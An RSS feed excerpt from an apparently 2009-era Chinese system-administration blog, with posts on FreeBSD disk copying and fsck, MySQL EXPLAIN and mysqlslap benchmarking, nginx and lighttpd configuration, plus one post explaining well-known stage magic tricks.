创建新的文档系统 假如你的新硬盘为ad1, 而将来的根分区将是ad1s1a, 你可以先创建文档系统： newfs /dev/ad1s1a mount /dev/ad1s1a /mnt cd /mnt
复制： dump -f- / | restore -f- -r 这是把老的根文档系统复制输出到管道，restore从管道里读数据，写入当前目录所在的文档系统。
按部就班复制其他文档系统 复制完後，也许 要修改新硬盘下的/etc/fstab，安装上新的分区，摘下老硬盘就可以了。 再补充一点，如果你要复制的是另外一台机器，可以用rsh，这样就可以通过网络把一个分区数据传送到另外一台机器，不需要NFS，不需SAMBA等就可以解决问题，而cp就很难作到了。 newfs /dev/ad1s1a mount /dev/ad1s1a /mnt cd /mnt rsh -l yourname thathost &amp;lsquo;dump -f- /&amp;rsquo; | restore -f- -r
http://www.cnblogs.com/znuwcj/archive/2006/08/22/483583.aspx</description>
    </item>
    
    <item>
      <title>fsck命令详解</title>
      <link>http://example.org/2009/03/25/fscke591bde4bba4e8afa6e8a7a3/</link>
      <pubDate>Wed, 25 Mar 2009 18:33:16 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/fscke591bde4bba4e8afa6e8a7a3/</guid>
      <description>功能说明：检查文件系统并尝试修复错误。 语　法：fsck [-aANPrRsTV][-t &amp;lt;文件系统类型&amp;gt;][文件系统&amp;hellip;] 补充说明：当文件系统发生错误四化，可用fsck指令尝试加以修复。 参　数： -a 自动修复文件系统，不询问任何问题。 -A 依照/etc/fstab配置文件的内容，检查文件内所列的全部文件系统。 -N 不执行指令，仅列出实际执行会进行的动作。 -P 当搭配”-A”参数使用时，则会同时检查所有的文件系统。 -r 采用互动模式，在执行修复时询问问题，让用户得以确认并决定处理方式。 -R 当搭配”-A”参数使用时，则会略过/目录的文件系统不予检查。 -s 依序执行检查作业，而非同时执行。 -t&amp;lt;文件系统类型&amp;gt; 指定要检查的文件系统类型。 -T 执行fsck指令时，不显示标题信息。 -V 显示指令执行过程。 例子 : 检查 msdos 档案系统的 /dev/hda5 是否正常，如果有异常便自动修复 : fsck -t msdos -a /dev/hda5
注意 :
此指令可与 /etc/fstab 相互参考操作来加以了解。
运行fsck命令后产生的文件有什么用？
当执行fsck命令时，fsck命令如果发现存在孤立的文件或目录，这些孤立的文件或目录对于系统管理员或用户来说，无法访问到它，因为它与它的上级 目录失去了关联，如果用户允许fsck重新把它们找回来的话，fsck命令就会把这些孤立的文件或目录放在文件系统的/lost+found目录下，并用 各自的i-node号来命名，以便用户查找自己需要的文件。Lost+found目录通过它的英文含义我们都可以知道，它是一个失物认领处。
因此当某个用户发现自己丢失了某个文件，可以在执行fsck之后到/lost+found目录下去查找，这时通过文件名已无法辨认出文件的作用，只能 用file之类的命令来确定文件的类型，如果是数据文件，可以用more或vi命令来查看，如果是二进制文件，可以用dbx命令来调试或者试着执行它(注 意它可能是一个具有破坏性的程序)，知道文件或目录的作用之后，可以对其进行改名。
如果用户不允许fsck把这些孤立的文件或目录找回来，那么fsck命令就会破坏这些文件或目录，彻底丢失这些文件或目录，用户或系统管理员永远也无法找回它们。
原文 http://hi.baidu.com/blvm/blog/item/7b7c95c46b61a6ad8226acf4.html</description>
    </item>
    
    <item>
      <title>mysql explain详解</title>
      <link>http://example.org/2009/03/25/mysql-explaine8afa6e8a7a3/</link>
      <pubDate>Wed, 25 Mar 2009 18:31:19 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/mysql-explaine8afa6e8a7a3/</guid>
      <description>在做sql查询的时候，应该想到explain，这样用来对sql的执行效率进行分析。
mysql explain的详解 explain显示了mysql如何使用索引来处理select语句以及连接表。可以帮助选择更好的索引和写出更优化的查询语句。 使用方法，在select语句前加上explain就可以了：
如：explain select surname,first_name form a,b where a.id=b.id
分析结果形式如下：
table type possible_keys key key_len ref rows extra a range id first_name First_name 9 NULL 23112 Using where　Using temporary　Using filesort b ref id　first_name id 4 id 2 Using where
EXPLAIN列的解释：
table：显示这一行的数据是关于哪张表的 type：这是重要的列，显示连接使用了何种类型。从最好到最差的连接类型为const、eq_reg、ref、range、indexhe和ALL possible_keys：显示可能应用在这张表中的索引。如果为空，没有可能的索引。可以为相关的域从WHERE语句中选择一个合适的语句 key：实际使用的索引。如果为NULL，则没有使用索引。很少的情况下，MYSQL会选择优化不足的索引。这种情况下，可以在SELECT语句中使用 USE INDEX（indexname）来强制使用一个索引或者用IGNORE INDEX（indexname）来强制MYSQL忽略索引 key_len：使用的索引的长度。在不损失精确性的情况下，长度越短越好 ref：显示索引的哪一列被使用了，如果可能的话，是一个常数 rows：MYSQL认为必须检查的用来返回请求数据的行数 Extra：关于MYSQL如何解析查询的额外信息。将在表4.3中讨论，但这里可以看到的坏的例子是Using temporary和Using filesort，意思MYSQL根本不能使用索引，结果是检索会很慢 extra列返回的描述的意义 Distinct:一旦MYSQL找到了与行相联合匹配的行，就不再搜索了 Not exists: MYSQL优化了LEFT JOIN，一旦它找到了匹配LEFT JOIN标准的行，就不再搜索了 Range checked for each Record（index map:#）:没有找到理想的索引，因此对于从前面表中来的每一个行组合，MYSQL检查使用哪个索引，并用它来从表中返回行。这是使用索引的最慢的连接之一 Using filesort: 看到这个的时候，查询就需要优化了。MYSQL需要进行额外的步骤来发现如何对返回的行排序。它根据连接类型以及存储排序键值和匹配条件的全部行的行指针来排序全部行 Using index: 列数据是从仅仅使用了索引中的信息而没有读取实际的行动的表返回的，这发生在对表的全部的请求列都是同一个索引的部分的时候 Using temporary 看到这个的时候，查询需要优化了。这里，MYSQL需要创建一个临时表来存储结果，这通常发生在对不同的列集进行ORDER BY上，而不是GROUP BY上 Where used 使用了WHERE从句来限制哪些行将与下一张表匹配或者是返回给用户。如果不想返回表中的全部行，并且连接类型ALL或index，这就会发生，或者是查询有问题不同连接类型的解释（按照效率高低的顺序排序） system 表只有一行：system表。这是const连接类型的特殊情况 const:表中的一个记录的最大值能够匹配这个查询（索引可以是主键或惟一索引）。因为只有一行，这个值实际就是常数，因为MYSQL先读这个值然后把它当做常数来对待 eq_ref:在连接中，MYSQL在查询时，从前面的表中，对每一个记录的联合都从表中读取一个记录，它在查询使用了索引为主键或惟一键的全部时使用 ref:这个连接类型只有在查询使用了不是惟一或主键的键或者是这些类型的部分（比如，利用最左边前缀）时发生。对于之前的表的每一个行联合，全部记录都将从表中读出。这个类型严重依赖于根据索引匹配的记录多少—越少越好 range:这个连接类型使用索引返回一个范围中的行，比如使用&amp;gt;或&amp;lt;查找东西时发生的情况 index: 这个连接类型对前面的表中的每一个记录联合进行完全扫描（比ALL更好，因为索引一般小于表数据） ALL:这个连接类型对于前面的每一个记录联合进行完全扫描，这一般比较糟糕，应该尽量避免</description>
    </item>
    
    <item>
      <title>freebsd系统一启动就进入单用户模式</title>
      <link>http://example.org/2009/03/25/freebsde7b3bbe7bb9fe4b880e590afe58aa8e5b0b1e8bf9be585a5e58d95e794a8e688b7e6a8a1e5bc8f/</link>
      <pubDate>Wed, 25 Mar 2009 18:26:34 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/freebsde7b3bbe7bb9fe4b880e590afe58aa8e5b0b1e8bf9be585a5e58d95e794a8e688b7e6a8a1e5bc8f/</guid>
      <description>提示大概和下面一样
/dev/ad0s1a:File System Clean;Skipping Checks /dev/ados1a:Clean,480970 free(226 frags,60093 blocks,0.0% fragmentation) /dev/ados1e:DEFER FOR BACKGROUND CHECKING /dev/ados1f:DEFER FOR BACKGROUND CHECKING ad0:FAILURE -READ_DMA status=51 error=40 LBA=3306739 /dev/ad0s1d:CANNOT READ BLK:160948 /dev/ad0s1d:UNEXPECTED SOFT UPDATE INCONSISTENCY;RUN fsck MANUALLY. THE FOLLOWING FILE SYSTEM HAD AN UNEXPECTED INCONSISTENCY: usf:/dev/ados1d(/usr) Automatic file system check failed;help! OCT 24 19:18:42 init:/bin/sh on /etc/rc terminated abnormally,going to single use mode Enter full pathname of shell or RETURN for /bin/sh:
####################
原因：文件系统崩溃了，各分区损坏
解决方法：</description>
    </item>
    
    <item>
      <title>试析FreeBSD 6.2 的rc脚本系统</title>
      <link>http://example.org/2009/03/25/e8af95e69e90freebsd-62-e79a84rce8849ae69cace7b3bbe7bb9f/</link>
      <pubDate>Wed, 25 Mar 2009 11:20:52 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/e8af95e69e90freebsd-62-e79a84rce8849ae69cace7b3bbe7bb9f/</guid>
      <description>杜比环绕声 http://blog.chinaunix.net/u/12258/showart_292352.html
一、从mysql的启动脚本说起
配置mysql的时候，如果需要启动运行 mysql server，按照 mysql 手册上的说明，需要在 /etc/rc.conf 中，添加一条信息：
mysql_enable=&amp;quot;YES&amp;quot; 这样在重新启动系统的时候，就可以自动运行 mysqlserver.
如果需要运行时，停止 mysqlserver 或者重新启动 mysqlserver，可以使用下面的命令：
停止mysqlserver: shell&amp;gt;/usr/local/etc/rc.d/mysql-server stop 重新启动mysqlserver: shell&amp;gt;/usr/local/etc/rc.d/mysql-server restart
其实无论是mysqlserver还是apache等系统服务，都可以利用上面提到的参数“stop“，”restart“等进行程序维护
这属于FreeBSD系统rc脚本系统的具体应用。
FreeBSD的rc脚本系统在服务程序的管理上，主要是体现在 /etc/rc.d 和 /usr/local/etc/rc.d 这两个目录下的可执行脚本，系统级别的服务程序的脚本大都安装在 /etc/rc.d目录下，而用户级别的服务程序的脚本都安装在 /usr/local/etc/rc.d 目录下。如 mysql server 在安装的时候会在 /usr/local/etc/rc.d目录下安装一个 mysql-server 的脚本文件。
服务程序的管理，其实运行的就是对应的脚本文件。如上面举例的停止服务，重新启动服务，运行的都是mysql-server脚本。
二、mysql-server 启动脚本的说明
下面的脚本代码是freebsd 6.2中mysqlserver 5.0的启动脚本。具体的功能在脚本代码中注释！
#!/bin/sh
$FreeBSD: ports/databases/mysql50-server/files/mysql-server.sh.in,v 1.3 2006/03/07 16:25:00 ale Exp $ #下面这部分文本描述了可以在rc.conf中设置、添加的启动条目，用来控制mysqlserver启动的一些具体细节。
PROVIDE: mysql REQUIRE: LOGIN KEYWORD: shutdown Add the following line to /etc/rc.conf to enable mysql: mysql_enable (bool): Set to &amp;ldquo;NO&amp;rdquo; by default.</description>
    </item>
    
    <item>
      <title>mysql 压力测试结果</title>
      <link>http://example.org/2009/03/25/mysql-e58e8be58a9be6b58be8af95e7bb93e69e9c/</link>
      <pubDate>Wed, 25 Mar 2009 09:13:57 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/mysql-e58e8be58a9be6b58be8af95e7bb93e69e9c/</guid>
      <description>freebsd 7.0 amd64
mysqlslap -a --concurrency=5,10,20,50,150 --number-of-queries 100000 --debug-info Benchmark Average number of seconds to run all queries: 766.733 seconds Minimum number of seconds to run all queries: 766.733 seconds Maximum number of seconds to run all queries: 766.733 seconds Number of clients running queries: 5 Average number of queries per client: 20000 Benchmark Average number of seconds to run all queries: 820.050 seconds Minimum number of seconds to run all queries: 820.</description>
    </item>
    
    <item>
      <title>关于Nginx&#43;PHP fastcgi 胜过Apache十倍 自己验证</title>
      <link>http://example.org/2009/03/25/e585b3e4ba8enginxphp-fastcgi-e8839ce8bf87apachee58d81e5808d-e887aae5b7b1e9aa8ce8af81/</link>
      <pubDate>Wed, 25 Mar 2009 08:54:05 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/e585b3e4ba8enginxphp-fastcgi-e8839ce8bf87apachee58d81e5808d-e887aae5b7b1e9aa8ce8af81/</guid>
      <description>记得自己每一次知道nginx 还是在 群里讨论张老师的文章
他的最新文章 Nginx 0.7.x + PHP 5.2.8（FastCGI）搭建胜过Apache十倍的Web服务器（第4版）[原创] http://blog.s135.com/post/366/
我自己是在 freebsd 7.0服务器上 硬件配置
Intel(R) Xeon(R) CPU E5410 @ 2.33GHz *2 内存 4G sas 146 * 2 raid1 基本和张老师的配置差不多，
nginx 配置
user www www; worker_processes 8; #error_log logs/error.log; #error_log logs/error.log notice; #error_log logs/error.log info; #pid logs/nginx.pid; worker_rlimit_nofile 200000; events { worker_connections 200000; #use kqueue; } php-cgi 开启 128 进程
实际结果， nginx 也许处理静态页面可以达到3W并发，但是如是果php 得估计不行，我自己用 webbench 开起1W连接，本机差点没死，但此时 php页面打开已经相当的慢了，但status 速度仍然很快，说明nginx 的承载能力确实很强，但php处理这块依然是最大的瓶颈,此文只是本人自己测试,也许是本本配置系统有问题,导致达不到3W并发!</description>
    </item>
    
    <item>
      <title>FreeBSD环境下的Lighttpd 参数配置与性能优化</title>
      <link>http://example.org/2009/03/25/freebsde78eafe5a283e4b88be79a84lighttpd-e58f82e695b0e9858de7bdaee4b88ee680a7e883bde4bc98e58c96/</link>
      <pubDate>Wed, 25 Mar 2009 08:34:24 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/freebsde78eafe5a283e4b88be79a84lighttpd-e58f82e695b0e9858de7bdaee4b88ee680a7e883bde4bc98e58c96/</guid>
      <description>简单说一下：Lighttpd是一个轻量级的Web 服务器，支持FastCGI, CGI, Auth, 输出压缩(output compress), URL重写, Alias等重要功能。它具有非常低的内存开销，cpu占用率低，效能好，以及丰富的模块等特点。其静态文件的响应能力远高于Apache，可谓Web服务器的后期之秀。
许多技术专家认为，在Web 服务器中Lighttpd比Apache更小更轻量，却拥有比后者更高的性能。虽然Lighttpd在Web服务器方面只占很小的市场份额，“但它正极速增长，日后必将是Web服务器领域的有力竞争者。” 针对我们的普遍应用情况下，对配置文件进行一些修改。Time per request: 能达到0.65 [ms]左右相对于以前测的0.734[ms]左右，性能有很大提高。如果有大量的时间对每个性能指标进行测试，去掉不必要的模块和特性，应该在性能上还会有所提高，估计最好能到0.61[ms]左右。最近测试如下： lighttpd 配置文件：去掉了很多不必要的特性。
#######lighttpd.conf. server.port = 7983 , server.modules = (&amp;quot;mod_access&amp;quot;) server.document-root = &amp;quot;/usr/home/yangjian/lighttpd/doc/&amp;quot; server.pid-file = &amp;quot;/usr/home/yangjian/lighttpd/lighttpd.pid&amp;quot; mimetype.assign = ( &amp;quot;.html&amp;quot; =&amp;gt; &amp;quot;text/html&amp;quot;, &amp;quot;.js&amp;quot; =&amp;gt; &amp;quot;text/javascript&amp;quot;, ) server.max-keep-alive-requests =4000 dir-listing.activate = &amp;ldquo;disable&amp;rdquo;
LiteSpeed的测试都是在默认配置下。它的结果不太稳定，最好的记录是0.603ms，这是lighttpd所没有过的好成绩，但大多数情况下都在 0.70左右，有好多次在0.76以上。我这里说的都是LiteSpeed的标准版，pro版是要花钱的性能当然要好些。LiteSpeed是同过web 管理的，这是它的一个比较好的特性。如果经过优化我想它和lighttpd应该还是不差上下的。 我暂时先选择相对稳定点的lighttpd作为我们的web server，然后对它的配置和优化进行说明。Lighttpd配置文件很简单，相信大家配过apache的都能看明白。我就只对影响性能的指标挑出来讨论。参考文章http://www.lighttpd.net/documentation 可以看出我上面的那个配置文件非常简短。我去掉了所有不必要的特性。添加的模块只有mod_access，如果没有它访问是就会出现403错误。除了它之外系统默认启用的模块有 mod_indexfiles ，mod_dirlisting， mod_staticfile。但在默认已经编译进去的模块清单如下： 对于这些已经编译进去的在启用时就非常简单了，enable一下就ok了。Lighttpd想添加一个功能一般情况下只需要添加一两行指令到配置文件中，比apache易配置多了。
Plugins: enabled: mod_access
mod_accesslog mod_alias
mod_auth mod_cgi mod_compress mod_dirlisting mod_evhost mod_expire mod_fastcgi
mod_indexfiles mod_proxy mod_rrdtool mod_scgi mod_secdownload mod_setenv mod_simple_vhost mod_staticfile mod_status mod_userdir mod_usertrack mod_webdav disabled: mod_cml mod_mysql_vhost mod_redirect mod_rewrite</description>
    </item>
    
    <item>
      <title>使用pkgtools.conf加强portupgrade</title>
      <link>http://example.org/2009/03/25/e4bdbfe794a8pkgtoolsconfe58aa0e5bcbaportupgrade/</link>
      <pubDate>Wed, 25 Mar 2009 08:26:12 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/e4bdbfe794a8pkgtoolsconfe58aa0e5bcbaportupgrade/</guid>
      <description>freebsd的ports非常优秀，使用ports安装的软件可以用portupgrade进行升级。 以前一直有一个问题困扰我。那就是：我在用ports安装某个软件，如果指定了一些特殊的编译参数，如安装mysql时指定特殊字符集等
make WITH_CHARSET=gbk WITH_XCHARSET=all BUILD_OPTIMIZED=yes install clean 这样安装的mysql在使用portupgrade升级的时候，只按照默认的编译，也就是说上面的特殊参数丢失了。使得我在升级mysql的时候不得不手动用make deinstall make install升级。
其实，有一个文件可以让portupgrade升级的时候加入某些参数。那就是/usr/local/etc/pkgtools.conf 编辑该文件并加入以下内容
MAKE_ARGS = { &#39;databases/mysql*-server&#39; =&amp;gt; [ &#39;WITH_CHARSET=gbk&#39;, &#39;WITH_XCHARSET=all&#39;, &#39;SKIP_DNS_CHECK=yes&#39;, &#39;BUILD_OPTIMIZED=yes&#39;, &#39;BUILD_STATIC=yes&#39;, ], } 这样portupgrade会在升级mysql的时候应用上述参数。
原文 http://freebsd.5d6d.com/thread-45-1-1.html</description>
    </item>
    
    <item>
      <title>用Mysqlslap压力测试mysql（转）</title>
      <link>http://example.org/2009/03/25/e794a8mysqlslape58e8be58a9be6b58be8af95mysqlefbc88e8bdacefbc89/</link>
      <pubDate>Wed, 25 Mar 2009 07:59:31 +0000</pubDate>
      
      <guid>http://example.org/2009/03/25/e794a8mysqlslape58e8be58a9be6b58be8af95mysqlefbc88e8bdacefbc89/</guid>
      <description>转自 http://yueliangdao0608.blog.51cto.com/397025/81602
MySQL5.1地的确提供了好多有力的工具来帮助我们DBA进行数据库管理。 现在看一下这个压力测试工具mysqlslap. 关于他的选项手册上以及&amp;ndash;help介绍的很详细。 我解释一下一些常用的选项。 这里要注意的几个选项：
--concurrency代表并发数量，多个可以用逗号隔开，当然你也可以用自己的分隔符隔开，这个时候要用到--delimiter开关。 --engines代表要测试的引擎，可以有多个，用分隔符隔开。 --iterations代表要运行这些测试多少次。 --auto-generate-sql 代表用系统自己生成的SQL脚本来测试。 --auto-generate-sql-load-type 代表要测试的是读还是写还是两者混合的（read,write,update,mixed） --number-of-queries 代表总共要运行多少次查询。每个客户运行的查询数量可以用查询总数/并发数来计算。比如倒数第二个结果2=200/100。 --debug-info 代表要额外输出CPU以及内存的相关信息。 --number-int-cols 代表示例表中的INTEGER类型的属性有几个。 --number-char-cols 意思同上。 --create-schema 代表自己定义的模式（在MySQL中也就是库）。 --query 代表自己的SQL脚本。 --only-print 如果只想打印看看SQL语句是什么，可以用这个选项。 现在来看一些测试的例子。 1、用自带的SQL脚本来测试。 MySQL版本为5.1.23
[root@localhost ~]# mysqlslap --defaults-file=/usr/local/mysql-maria/my.cnf --concurrency=50,100,200 --iterations=1 --number-int-cols=4 --number-char-cols=35 --auto-generate-sql --auto-generate-sql-add-autoincrement --auto-generate-sql-load-type=mixed --engine=myisam,innodb --number-of-queries=200 --debug-info -uroot -p1 -S/tmp/mysql_3310.sock Benchmark Running for engine myisam Average number of seconds to run all queries: 0.063 seconds Minimum number of seconds to run all queries: 0.</description>
    </item>
    
    <item>
      <title>著名魔术师大卫魔术揭秘</title>
      <link>http://example.org/2009/03/24/e89197e5908de9ad94e69cafe5b888e5a4a7e58dabe9ad94e69cafe68fade7a798/</link>
      <pubDate>Tue, 24 Mar 2009 15:18:34 +0000</pubDate>
      
      <guid>http://example.org/2009/03/24/e89197e5908de9ad94e69cafe5b888e5a4a7e58dabe9ad94e69cafe68fade7a798/</guid>
      <description>大卫穿越长城
美国超级魔术大师科波菲尔表演的魔术&amp;ndash;穿越长城，长城是中国人民智慧的结晶，魔术师是不可能采用钻洞，挖墙来达到魔术神奇的效果，唯有采用魔术的障眼法。让我将这套魔术的表演过程描述一下，也许你可能明白一二。魔术师从木梯登上一个靠墙的舞台，四周立刻围上白布，灯光起，白布上出现魔术师的身影，这时木梯悄悄地移掉，通过大吊车吊到长城另一边，在魔术师从长城钻出来后，木梯靠上去，魔术师从木梯下来。注意我为何大量描述木梯呢？原来机关就在木梯上，木梯是经过特殊设计的，刚好能容下魔术师。其它我不说了，你明白了吗！
纸牌魔术
魔术师请一位观众抽一张牌，并在纸牌的任何部分撕下一角，将这一角保存好。然后魔术师把这张牌撕碎、烧成灰，并与火药拌和。另一位观众拿着一根钉子，魔术师请他把火药和钉子装到枪膛里去。接着，他拿过枪，对着墙壁射去。从枪口射出的钉子将被撕碎的纸牌钉在墙上，只是缺了给观众撕掉的一角。将那撕去的一角取来核对，完全吻合。这一奇妙节目的奥秘在于：当魔术师拿到被观众撕掉一只角的纸牌时，同时将另一张纸牌放在上面，也撕掉类似的一个角，他就用这张牌继续表演下去，而原牌由助手拿到后台去了。枪是经过处理的，即魔术师可以偷偷地把钉子重新从枪里拿出来。助手在台后将牌用钉子钉到一小块木板上，这块板用和舞台背墙根同的糊墙纸贴上。墙上有一个孔，小木板从此孔后面椎过去，孔前挂着有线相连的一块墙纸。当魔术师开枪射击时，助手将线一拉，这块墙纸便落到地上，于是小木板出现了，看来好象钉子及纸牌都是射上去的。
冻不死的魔术师 超级魔术师大卫把自己关在冰窟窿里，几天几夜，不吃不喝，拆掉冰块后， 安然无恙。冰窟窿用巨大的冰块组成，整个过程由摄像机监控，魔术师身上有医学用的监控器，在外面可以看到魔术师的心跳和呼吸变动。原来在冰窟窿的地板下有个开关，正好够一个人爬上爬下，下面是一个很舒适的小屋，魔术师找了一个和自己一样高的人，先睡在下面大吃大喝，等魔术师冷得受不了，那个人就爬上来，站在他背后，魔术师和他换位，像金蝉脱壳一样，换人。反复这样换，观众看见影子一点也没有变，可是人已经换掉了，怎么会冷的受不了呢？监视仪器也可以看见里面的人的心跳。真正的魔术师正在地窖里喝酒
自由女神的消失 美国超级魔术大师大卫.科波菲尔表演的魔术&amp;ndash;自由女神消失，着实让世界大吃一惊。这一魔术谜底至今仍未能揭示。中国魔术界从专业的角度进行了一番研究，终于略知一二，但仍未全部破解。大家都明白，自由女神是不可能消失的，消失的只会是我们短暂的记忆，在这里我不可能手把手地教大家如何表演这套魔术，因为这套魔术耗资几百万美元，国内没有一位魔术大师可以表演。我仅作提示：搭建作为观众席的巨型地板是活动的，它可以与自由女神形成一定角度，由于观众席距离自由女神很远，只要一个小小的倾斜角度，就可足以让自由女神消失。在地板倾斜同时，遮挡自由女神的黑布其实也在同时上升，一切动作都是由电脑控制缓慢运作，观众无法觉察，等黑布掉下来的时候，观众只能看到自由女神上方的空荡荡天空，自由女神也就神奇消失了
人体三分身
舞台中摆一只立柜，柜门上绘有一个粗线条的人物轮廓，其头部、左右手及左脚处都开有一个洞。表演者打开柜门，请一位女演员进入柜中，并随手关上柜门，这时，女演员面都对着头部洞口，左右手和左脚也各伸出洞口外。表演者指指柜中女演员手足，女演员的手、脚摇了摇，证明她确实在柜里。接着，表演者取二块薄钢刀，—一插入柜腰中处，随后向右边一推，柜中节被分开了，柜中间还能容表演者的一块手帕挥来挥去，以示柜中节确被移开，显然女演负的确被分成三段了。虽然女演员的头、手和脚各分布于三处，但令人惊奇的是，她的头，手和脚还能自如地活动呢！最后，表演者将柜中节推回原处，拨出薄钢刀片，打开门，女演员仍笑容满面地从柜中走了出来。“人体三分身”是一套现代的外国大型魔术。法国魔术家让 ·罗加尔，１９８２年在法国巴黎举行的世界魔术锦标赛时作了精彩的表演。“人体三分身”它的机关除了道具设计精巧以外。关键是根据色彩学的原理对道具进行绘制，从而使观众产生视觉误差。推开柜中节后，中段和上下段相连的部份看上去很窄狭，似乎人体无法通过，其实它是有一定宽度的。只要女演员腰身苗条，有一定的柔腰基本功，侧身在柜中节是不成问题的。
火苗穿巾
表演者右手拿着一块纱巾，左手拿着一只启燃火苗的气体打火机，然后他将纱巾往火苗上一挨，火苗即穿过纱巾顶面。他又把纱巾移来移去，既不曾烧毁纱巾，也没有把火熄灭，颇为离奇有趣。一、表演前，将气体打火机启燃（火苗大小要适中），然后将纱巾从火苗底部一边挨入，并马上用右手来回牵动，这样，纱巾就不会烧坏了。二、由于气体打火机的火苗底都是向上浮起的（与其它火苗不同）。故能穿过薄纱巾上面。因此，只要不断往复牵动纱巾，即可使火苗浮于纱巾上面了
空中飞人
1.在舞台X放两張椅子。2.一个人躺在椅子的X，头脚刚好躺在椅子上。3.表演者则拿一張床单，盖在躺卧的人身上，只露出头和脚。4.表演者念咒時，用脚移开躺着的人脚部那张椅子，而躺着的人，依然不动！然后，将头部的椅子也拿开。但是，躺着的人还是丝毫不受影响，仍然可以随着咒语上升或下降。原来睡着的人的腿是假的，他实际上是蹲着的。明白了吧？
卡车消失
超级魔术师大卫把一辆巨大的卡车，开到舞台X，用巨大的铁笼罩住，等观众看清楚后，铁笼外面罩上白色幕布。然后请观众手挽手围成一个大圆圈，把白色幕布团团围住。不久，白布从上倒下，卡车消失了。在观众眼前消失了！原来，卡车里装了很多人，幕布下来的时候，观众上台，在观众围圈的过程中，车上的人下来，和观众相对，灯光照出了他们的影子，台下的观众以为是上台的观众的影子，其实是里面人的身影。卡车上其余的赶紧把铁笼与卡车连接，铁笼是可以活动的，在幕布降下的同时，灯光改变，铁笼和里面的人全部收到了车里，卡车被一个巨大的起重机吊到了舞台上方，观众只看见上台的观众手挽手围成一圈，卡车不见了。这个魔术和穿越长城，遮盖自由女神以及遮盖飞机的魔术方式非常接近。但是没有钱是表演不了的，要花很多很多钱来搭建舞台和做道具
锯人
超级魔术师大卫 “锯人”是魔术史上令人惊讶不已的传统节目之一。表演时, 表演者让他的助手们把一个长方形木箱抬到一张桌子上。箱子的上面和四周均可打开，向观众交待以后，一位女助手躺进箱子，将头和脚露在箱子两端的小孔外面。于是，表演者拿起锯子，把箱子连同女助手一锯为二，在锯缝中再插入两块板。现在可使箱子的两部分互相脱离了，观众们看到女助手的脚在动、脸在笑。 “戳穿西洋镜，一点不稀奇。”原来，参与表演的有两名女助手，第二名助手事先早就躺在桌子里面了。这位人们看不见的女助手可通过箱子底部的翻板把腿伸进箱子，使脚露在箱外，而当着观众的面进入箱子的女助手却把腿曲了起来。 还有一个锯人魔术，是大卫改装了的，因为不能老表演被识破了的魔术，这回是一个女助手哦！不过这个箱子可以往下凹下去，女助手睡上去以后，屁股陷下去了，腰也陷下去了，魔术师在合拢木板的时候，在女助手的腰上面插了一块钢板，然后他拿电锯开始锯，锯到钢板就停下来，头和身子被锯开了，其实没有锯到啊！</description>
    </item>
    
    <item>
      <title>NginxSimplePythonFCGI</title>
      <link>http://example.org/2009/03/24/nginxsimplepythonfcgi/</link>
      <pubDate>Tue, 24 Mar 2009 11:20:53 +0000</pubDate>
      
      <guid>http://example.org/2009/03/24/nginxsimplepythonfcgi/</guid>
      <description>Dispatching TurboGears Python via FCGI This confirmed to run on Mac OS X 10.4.7 under Turbogears 0.9.9 and 1.1a (so, no reason not to run under the 1.0b release).
Information was drawn from the Turbogears trac wiki (http://trac.turbogears.org/turbogears/wiki/NginxIntegration) which show how to use Nginx to proxy to TG, and the nearby [NginxFcgiExample] page, the latter detailing the PHP/FCGI process.
This is for Nginx/FCGI/Turbogears
Conventions Substitute thoughout with the values relevant to your own set-up:</description>
    </item>
    
    <item>
      <title>Lighttpd中为php加上open_basedir</title>
      <link>http://example.org/2009/03/24/lighttpde4b8ade4b8baphpe58aa0e4b88aopen_basedir/</link>
      <pubDate>Tue, 24 Mar 2009 09:58:30 +0000</pubDate>
      
      <guid>http://example.org/2009/03/24/lighttpde4b8ade4b8baphpe58aa0e4b88aopen_basedir/</guid>
      <description>举例说明 一、
fastcgi.server = ( &amp;quot;.php&amp;quot; =&amp;gt; (( &amp;quot;socket&amp;quot; =&amp;gt; &amp;quot;/tmp/php-fastcgi.socket&amp;quot;, &amp;quot;bin-path&amp;quot; =&amp;gt; &amp;quot;/usr/bin/php5/bin/php-cgi -d open_basedir=/web/www/php5:/web/www/php&amp;quot;, &amp;quot;max-procs&amp;quot; =&amp;gt; 10, &amp;quot;bin-environment&amp;quot; =&amp;gt; ( &amp;quot;PHP_FCGI_CHILDREN&amp;quot; =&amp;gt; &amp;quot;16&amp;quot;, &amp;quot;PHP_FCGI_MAX_REQUESTS&amp;quot; =&amp;gt; &amp;quot;1000&amp;quot;, ), &amp;quot;broken-scriptfilename&amp;quot; =&amp;gt; &amp;quot;enable&amp;quot; )) ) 二、
cgi.assign = ( &amp;quot;.php&amp;quot; =&amp;gt; &amp;quot;/usr/bin/php5/bin/php-cgi -d open_basedir=/web/www/php5:/web/www/php&amp;quot; ) </description>
    </item>
    
    <item>
      <title>Netseek牛年拜年力作：Nginx 常见应用技术指南[Nginx Tips] 第二版</title>
      <link>http://example.org/2009/03/24/netseeke7899be5b9b4e68b9ce5b9b4e58a9be4bd9cefbc9anginx-e5b8b8e8a781e5ba94e794a8e68a80e69cafe68c87e58d97nginx-tips-e7acace4ba8ce78988/</link>
      <pubDate>Tue, 24 Mar 2009 09:18:29 +0000</pubDate>
      
      <guid>http://example.org/2009/03/24/netseeke7899be5b9b4e68b9ce5b9b4e58a9be4bd9cefbc9anginx-e5b8b8e8a781e5ba94e794a8e68a80e69cafe68c87e58d97nginx-tips-e7acace4ba8ce78988/</guid>
      <description>作者:NetSeek http://www.linuxtone.org (IT运维专家网|集群架构|性能调优) 欢迎转载,转载时请务必以超链接形式标明文章原始出处和作者信息及本声明. 首发时间: 2008-11-25 更新时间:2009-1-14
目 录 一、 Nginx 基础知识 二、 Nginx 安装及调试 三、 Nginx Rewrite 四、 Nginx Redirect 五、 Nginx 目录自动加斜线: 六、 Nginx Location 七、 Nginx expires 八、 Nginx 防盗链 九、 Nginx 访问控制 十、 Nginx日志处理 十一、 Nginx Cache 十二、 Nginx负载均衡 十三、 Nginx简单优化 十四、 如何构建高性能的LEMP环境 十五、 Nginx服务监控 十六、 常见问题与错误处理. 十七、 相关资源下载
